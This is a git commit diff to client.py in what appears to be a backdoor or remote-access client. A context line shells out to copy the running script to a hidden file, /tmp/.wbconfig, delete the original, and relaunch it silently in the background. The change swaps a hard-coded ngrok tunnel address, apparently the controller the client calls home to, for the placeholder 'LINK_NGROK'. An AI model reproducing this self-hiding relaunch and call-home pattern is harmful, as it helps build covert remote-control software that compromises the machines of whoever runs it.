8f3474ed0f14e6133bb85ea3fd780f46152906d0
Gabriel H <gabrielhostalacioac1@gmail.com>
2017-05-19 21:34:00 -0300

    Update client.py

--- client.py
+++ client.py
@@ -17,4 +17,4 @@ except:
 	os.system('cp '+sys.argv[0]+' /tmp/.wbconfig 2>/dev/null;rm '+sys.argv[0]+' 2>/dev/null;python /tmp/.wbconfig running & 2>/dev/null')
 	sys.exit(0)
 
-run('http://5224f8e4.ngrok.io')
+run('LINK_NGROK')
